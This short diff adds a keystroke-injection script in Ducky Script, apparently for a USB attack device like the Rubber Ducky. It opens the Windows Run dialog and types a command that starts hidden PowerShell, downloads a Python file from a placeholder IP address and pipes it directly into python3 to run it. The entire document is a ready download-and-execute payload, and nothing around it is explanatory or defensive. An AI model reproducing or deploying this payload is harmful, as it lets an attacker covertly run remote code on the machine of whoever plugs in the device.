@@ -1,0 +1,6 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd /c start /min "" powerShell -windowstyle hidden -c "(Invoke-WebRequest -Uri http://x.x.x.x/file.py).Content | python3 -"
+DELAY 500
+ENTER
